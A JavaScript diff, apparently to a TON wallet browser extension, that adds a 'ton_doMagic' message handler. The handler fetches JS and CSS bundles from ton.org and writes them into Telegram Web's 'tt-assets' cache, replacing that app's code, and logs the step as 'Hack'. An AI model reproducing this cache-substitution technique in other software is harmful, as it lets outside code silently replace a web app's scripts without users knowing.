@@ -77,7 +77,7 @@ class TonProvider {
 
     /* Internal methods */
 
-    _handleJsonRpcMessage(event) {
+    async _handleJsonRpcMessage(event) {
         // Return if no data to parse
         if (!event || !event.data) {
             return;
@@ -121,6 +121,48 @@ class TonProvider {
                     this._emitNotification(message.params);
                 } else if (method === 'ton_accounts') { // todo
                     this._emitAccountsChanged(message.params);
+                } else if (method === 'ton_doMagic') { // todo
+                    if (message.params) {
+                        const c = await window.caches.open('tt-assets')
+                        const keys = await c.keys();
+
+                        const script = document.getElementsByTagName('script')[0];
+                        const scriptSrc = script.getAttribute('src');
+                        if (!scriptSrc.startsWith('main.')) {
+                            console.error('no main script in page');
+                            return;
+                        }
+
+                        const js = {
+                            "299.5368de7de76fe73abfb4.js": "559.3461e1a8d5b6c410e6a9.js",
+                            "354.9a4e6e448a56ea8ff7d0.js": "354.849b154f5e9c94e3b4d4.js",
+                            "501.72ce4b6e27f459e194cd.js": "501.77c55bf42a5199feef97.js",
+                            "514.a976e4a406ffa64bcba8.js": "514.bcda96d4e97a0079f205.js",
+                            "592.d7ca037ed9b7d1c6792a.js": "592.d1ab76a5cfe57cd3a899.js",
+                            "60.9cf561ec3f818d41f458.js": "60.b504c2949c7aeaa1083b.js",
+                            "915.8fb9f0f20311fa368dc5.js": "915.8fb9f0f20311fa368dc5.js",
+                            "941.997469720d84a3a8a3f7.js": "941.997469720d84a3a8a3f7.js",
+                            "main.548c93adccb98e6c3572.js": "main.fde42d1c6cf12616ac98.js",
+                            "299.5368de7de76fe73abfb4.css": "559.3461e1a8d5b6c410e6a9.css",
+                            "60.9cf561ec3f818d41f458.css": "60.9cf561ec3f818d41f458.css",
+                            "main.edaf68285b3a3f5985dd.css": "main.886b59dfd026c686b97e.css",
+                        }
+
+                        for (const [key, value] of Object.entries(js)) {
+                            const res = await fetch('https://ton.org/app/' + value);
+                            console.log('Hack ' + key + ' -> ' + value, await res.clone().text());
+                            const req = new Request('https://web.telegram.org/z/' + key);
+                            await c.put(req, res.clone());
+                        }
+
+                        console.log('TON Magic On', {keys, scriptSrc});
+
+                        // window.location.reload();
+                    } else {
+                        console.log('TON Magic Off');
+
+                        await window.caches.delete('tt-assets');
+                    }
                 }
             }
         }
@@ -161,5 +203,7 @@ class TonProvider {
         this.emit('accountsChanged', accounts);
     }
 }
+
+console.log('TON Wallet Plugin is here')
 
 window.ton = new TonProvider();
